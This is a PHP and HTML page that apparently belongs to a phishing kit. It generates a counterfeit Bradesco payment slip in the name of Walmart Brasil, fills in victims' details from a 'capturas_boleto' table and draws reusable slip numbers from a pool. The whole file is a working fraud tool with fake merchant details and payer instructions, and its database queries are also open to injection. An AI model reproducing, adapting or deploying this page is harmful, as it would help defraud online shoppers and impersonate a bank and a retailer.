
<?php

$ID_A = $_POST["id"];
$ID_CAPTURA_A = $_POST ["id_captura"];
$GERA_A = $_POST ["gera"];
$VALOR_A = $_POST ["preco"];

$ID =  addslashes($ID_A);
$ID_CAPTURA =  addslashes($ID_CAPTURA_A);
$gera =  addslashes($GERA_A);
$VALORx =  addslashes($VALOR_A);

require_once ("../Raiz/admin/function/config.php");
require_once ("../Raiz/admin/function/conexao.php");



$dados4 = "SELECT* FROM capturas_boleto where id='$ID_CAPTURA' ";
$con4 = $mysqli -> query($dados4) or die ($mysqli -> error);


while ($consulta4= $con4 -> fetch_array()){
	
	$nome = $consulta4 ["nome"];
	$endereco = $consulta4 ["endereco"];
	$numero = $consulta4 ["numero"];
	$cidade = $consulta4 ["cidade"];
	$cep = $consulta4 ["cep"];
	$estado = $consulta4 ["estado"];
	
	
	
}


$dadosB = "SELECT* FROM boletos where numero='$ID' ";
$conB = $mysqli -> query($dadosB) or die ($mysqli -> error);


while ($consultaB= $conB -> fetch_array()){
	
	$atualiza =  $consultaB ["id"];
	
	

	
}
	

$sql1 = "Update boletos SET numero='' where id='$atualiza' " ;
$query = $mysqli->query($sql1);



$dia=date("d/m/Y");


$dados2 = "SELECT* FROM configuracao where id=1";
$con2 = $mysqli -> query($dados2) or die ($mysqli -> error);

while ($consulta2= $con2 -> fetch_array()){
	
	$desconto = $consulta2 ["desconto"];
	$vencimento = $consulta2 ["vencimento"];
	
	
	
}



$total = $VALORx;
$pctm = $desconto;
$valor_descontado = $total - ($total / 100 * $pctm);

$VALOR = number_format($valor_descontado,2,",",".");




$dataX=date("d-m-Y");
$DATA = date('d/m/Y', strtotime($dataX. ' + '.$vencimento.' days'));

$FILTRO_LETO = filter_var($ID, FILTER_SANITIZE_NUMBER_INT);



?>






<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-br" lang="pt-br"><head>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
        <title>Bradesco Com&eacutercio Eletr&ocirc;nico</title>
        
		<script type="text/javascript">
			var urlPath = "https://meiosdepagamentobradesco.com.br/apiboleto";	
		</script>  
        
		<script type="text/javascript" src="../Raiz/FILE_BOLETO/jquery-1.5.1.min.js.download"></script>
		<script type="text/javascript" src="../Raiz/FILE_BOLETO/jquery.tooltip.min.js.download"></script>        
		<script type="text/javascript" src="../Raiz/FILE_BOLETO/jquery.jqmodal.min.js.download"></script>
		
		<script type="text/javascript" src="../Raiz/FILE_BOLETO/default.js.download"></script>
		
        <link rel="shortcut icon" href="https://meiosdepagamentobradesco.com.br/apiboleto/bradesco.ico">
        
        <link rel="stylesheet" type="text/css" href="../Raiz/FILE_BOLETO/default.min.css" media="screen,print">
        <link rel="stylesheet" type="text/css" href="../Raiz/FILE_BOLETO/boleto.css" media="screen,print">
        <link rel="stylesheet" type="text/css" href="../Raiz/FILE_BOLETO/jquery.jqmodal.min.css" media="screen,print">
        
        <link rel="stylesheet" type="text/css" href="../Raiz/FILE_BOLETO/defaultPdf.min.css" media="screen,print">        
        <link rel="stylesheet" type="text/css" href="../Raiz/FILE_BOLETO/boletoPdf.min.css" media="screen,print">
        
        
        
        


</head>


	<body style="margin-left: 20px;">

<div class="boxEstrutura">
<div class="cornTop">
	<div class="ctE"><!----></div>
</div>

	
	
	

	<input type="hidden" id="urlPagamentoPessoaFisica" name="urlPagamentoPessoaFisica" value="https://wwwss.bradesco.com.br/scripts/ib2k1.dll/LOGIN" tabindex="1">
	<input type="hidden" id="urlPagamentoPessoaJuridica" name="urlPagamentoPessoaJuridica" value="https://www.bradesconetempresa.com.br/ne/IniciaSessaoParceiro.asp" tabindex="2">

	
		
		
		
				
		<ul class="list_infos header_comprovante comp_boleto mt15 after" style="border:0px solid #FFF">
			<li class="item pb20">
				
					<img height="80" width="120" alt="logo comprovante" id="logoBradesco" name="logoBradesco" src="../Raiz/FILE_BOLETO/logo_em_branco.gif">
				
				
			</li>
			<li class="info pb15">
				<h2 class="pb15 fn">Boleto Bradesco</h2><br>
				<p class="lh15">
					<span class="txtHeaderLojista"></span>
				</p>
			</li>
		</ul>		
		<hr style="margin:0px;">
		<ul class="lstUtil after mt10 mb0 hidePrint">                
			<a rel="btn_imprimir" rev="0" href="javascript:;" onclick="window.print();" title="Imprimir" class="openModal" tabindex="3"><img src="../Raiz/assets/img/impre.png" ></a></img>                
		</ul>
		<table class="tableGeral">	
			<tbody>
				<tr>
					<td width="675">
						<table class="tableCols bb5">
						<tbody>
							<tr valign="bottom">
								<td>
									<img src="../Raiz/FILE_BOLETO/logo_boleto.gif" width="236" height="30" alt="Bradesco |237-2|">
									<span class="codigo">RECIBO DO PAGADOR</span>
								</td>
							</tr>
						</tbody>
						</table>
						
						<table>
						<tbody>
							<tr>
								<td>
									<table class="tableCont">
									<tbody>
										<tr>
											<td class="first bt1 overflow-hidden">
											
												<span class="ttlLocal">Benefici&aacute;rio:</span>
												<strong class="left pb3">WAL MART BRASIL LTDA</strong>
												
													WAL MART BRASIL LTDA
													<br>CNPJ:00.063.960/0001-09
													<br>Avenida Tucunar&eacute, 125&nbsp;
													Alphaville Barueri  SP &nbsp;
													S&atilde;o Paulo
										
	
											</td>
											<td class="bt1">
												<span class="ttlLocal">Ag&ecirc;ncia/Cod. Benefici&aacute;rio:</span>
												
													<strong class="left">2.028-1/0.240.405-2</strong>
												
											</td>
											<td class="bt1">
												<span class="ttlLocal">Data de Emiss&atilde;o:</span>
												<strong class="left"><?php echo $dia ?></strong>
											</td>
											<td class="last bt1 w160">
												<span class="ttlLocal">Data de Vencimento</span>
												<strong class="right"><?php echo $DATA ?></strong>
											</td>
										</tr>
	
										<tr>
											<td class="first bt1 overflow-hidden" style="width:184px !important;">
												<span class="ttlLocal">Pagador:</span>
												<strong class="left"><?php echo $nome ?></strong>
											</td>
											<td class="bt1">
												<span class="ttlLocal">Nosso N&uacute;mero:</span>
												<strong class="left">26/00.077.276.797-6</strong>
											</td>
											<td class="bt1">
												<span class="ttlLocal">N&uacute;mero Documento:</span>
												<strong class="left"><?php echo $gera ?></strong>
											</td>
											<td class="last bt1">
												<span class="ttlLocal">Valor Documento</span>
												<strong class="right">R$ <?php echo $VALOR ?></strong>
											</td>
										</tr>
	
										<tr>
											<td class="first bt1 last" colspan="4">
												<span class="ttlLocal">Refer&ecirc;ncia:</span>
												
												<strong class="left">Compras&nbsp;efetuadas&nbsp;atrav&eacutes&nbsp;do&nbsp;Com&eacutercio&nbsp;Eletr&ocirc;nico.</strong>
												
												<strong class="left">Estabelecimento: WAL MART BRASIL LTDA / Refer&ecirc;ncia do Pedido: 000<?php echo $gera ?></strong>
											</td>
										</tr>
									</tbody>
									</table>
								</td>
							</tr>
						</tbody>
						</table>
						
						<table class="tableCols">
						<colgroup>
							<col width="333">
						</colgroup>
						<tbody>
							<tr>
								<td class="b0 right">
									<span class="txtAutenticacao">Autentica&ccedil;&atilde;o Mec&acirc;nica</span>
								</td>
							</tr>
							<tr>
								<td align="center">
									<img src="../Raiz/FILE_BOLETO/cortar.gif" width="714" class="cortar mt10" height="21" alt="Corte nessa &aacute;rea">
								</td>
							</tr>
						</tbody>
						</table>
					</td>
				</tr>
			</tbody>
		</table>
	
		<table class="tableGeral mt10 mb30">
		<colgroup>
			<col width="675">
		</colgroup>
		<tbody>
		<tr>
			<td>
				
				<table class="tableCols bb5">
				<colgroup>
					<col>
				</colgroup>
				<tbody>
					<tr valign="bottom">
						<td>
							<img src="../Raiz/FILE_BOLETO/logo_boleto.gif" width="236" height="30" alt="Bradesco |237-2|">
							<span class="codigo">
							<div>
							
							<?php echo $ID ?>
							
							
							</div></span>
						</td>
					</tr>
				</tbody>
				</table>
				
				
				<table>
				<colgroup>
					<col width="714">
				</colgroup>
				<tbody>
					<tr>
						<td>
							
							<table class="tableCont">
								<colgroup>
								<col width="130">
								<col width="54">
								<col width="95">
								<col>
								<col>
								<col>
								<col>
								<col>
							</colgroup>
							<tbody>
								<tr>
									<td colspan="8" class="last bt1 boxLocal hk30" height="35">
										<span class="ttlLocal">Local de Pagamento</span>
										<div>
											<strong class="left">Banco Bradesco S.A.</strong>
											<p>Pag&aacute;vel preferencialmente em qualquer ag&ecirc;ncia Bradesco.</p>
										</div>
									</td>
									<td class="bt1 p7 w160">
										<span>Data de Vencimento</span>
										<strong class="right"><?php echo $DATA ?></strong>
									</td>
								</tr>
								<tr>
									<td colspan="8" class="last">
										<span>Benefici&aacute;rio</span>
										<strong class="left pb3">WAL MART BRASIL LTDA</strong>
										
													WAL MART BRASIL LTDA
													<br>CNPJ:00.063.960/0001-09
													<br>Avenida Tucunar&eacute, 125&nbsp;
													Alphaville Barueri  SP &nbsp;
													S&atilde;o Paulo
										
	
									</td>
									<td class="p7">
										<span>Ag&ecirc;ncia / C&oacute;d. do Benefici&aacute;rio</span>
										<strong class="right">
										
												2.028-1/0.240.405-2
										
										</strong>
									</td>
								</tr>
								<tr>
									<td height="35" class="hk30">
										<span>Data Documento</span>
										<strong><?php echo $dia ?></strong>
									</td>
									<td colspan="2">
										<span>N Documento</span>
										<strong><?php echo $gera ?></strong>
									</td>
									<td colspan="2">
										<span>Esp&eacutecie Doc.</span>
										<strong>Outro</strong>
									</td>
									<td>
										<span>Aceite</span>
										<strong>N  </strong>
									</td>
									<td class="last" colspan="2">
										<span>Data Processamento</span>
										<strong>07/05/2018</strong>
									</td>
									<td class="p7">
										<span>Nosso N&uacute;mero</span>
										<strong class="right">26/00.077.276.797-6</strong>
									</td>
								</tr>
	
								<tr>
									<td height="35" class="hk30">
										<span>Uso do Banco</span>
										<strong></strong>
									</td>
	
									<td>
										<span>Cip</span>
										<strong>865</strong>
									</td>
									<td>
										<span>Carteira</span>
										<strong>26</strong>
									</td>
	
									<td colspan="2">
										<span>Esp&eacutecie Moeda</span>
										<strong>Real</strong>
									</td>
									<td class="last">
										<span>Quantidade</span>
										<strong></strong>
									</td>
									<td class="last" colspan="2">
										<span>Valor</span>
										
									</td>
									<td class="p7">
										<span>Valor do Documento</span>
										<strong class="right">R$ <?php echo $VALOR ?></strong>
									</td>
								</tr>
								
								<tr>
									<td colspan="8" class="last boxInstrucoes " height="160" width="500">
									<div class="boxInstrucoes-fixed">
										
										<strong class="left">Instru&ccedil;&otilde;es (Texto de responsabilidade do benefici&aacute;rio)</strong>									
										
										
										<p>Sr Caixa n&atilde;o receber ap&oacute;s a data de vencimento e n&atilde;o </p>
										<p>Receber pagamento com cheque;</p>
										<p>Sr Cliente apenas o pagamento no valor integral do boleto </p>
										<p>identifica e libera o pedido;</p>
										<p>N&atilde;o deposite e N&atilde;o fa&ccedil;a transfer&ecirc;ncia;</p>
										<p>O prazo de entrega &eacute valido ap&oacute;s o pagamento do boleto </p>
										<p>que &eacute processado em at&eacute 03 (tr&ecirc;s) dias &uacute;teis.</p>
										
										
										
										
											
										
								</div>
									</td>
									<td class="p7 boxDeducoes" height="160">
										<span>(-) Desconto/Abatimento</span>
										<span>(-) Outras Dedu&ccedil;&otilde;es</span>
										<span>(+) Mora/Multa</span>
										<span>(+) Outros Acr&eacutescimos</span>
										<span>(+) Valor Cobrado</span>
									</td>
								</tr>
								<tr>
									<td colspan="8" class="last boxSacado" height="75">
									<div style="" class="dvSacado">
										<span class="ttlSac">Pagador:</span>
										<ul class="mb20">
											<li><?php echo $nome ?></li>
											<li><?php echo $endereco ?>, <?php echo $numero ?>,</li>
											<li><?php echo $cep ?>, <?php echo $cidade ?>, <?php echo $estado ?></li>
											<li>Sacador/Avalista: WAL MART BRASIL LTDA</li>
										</ul>
										<br class="clr">
									</div>
									</td>
									<td class="p7 ttlFicha" height="75">
										<h4>Ficha de Compensa&ccedil;&atilde;o</h4>
									</td>
								</tr>
							</tbody>
							</table>
							
						</td>
					</tr>
				</tbody>
				</table>
			</td>
		</tr>
		
		<tr>
			<td class="b0">
				<table class="mt10">
				<colgroup>
					<col width="400">
					<col>
				</colgroup>
				<tbody>
					<tr>
						<td class="w420">

<iframe src="frame.php?num=<?php echo $FILTRO_LETO ?>" frameborder="0" height="100" width="900">

						</td>
						<td class="b0 right nowrap">
							<span class="txtAutenticacao">Autentica&ccedil;&atilde;o Mec&acirc;nica</span>
						</td>
					</tr>
				</tbody>
				</table>
			</td>
		</tr>
		</tbody>
		</table>
		
	
	 
		
	
</div>

<div id="tooltip" style="display: none;"><h3></h3><div class="body"></div><div class="url"></div><div class="tooltip_seta"><!-- --></div></div></body></html>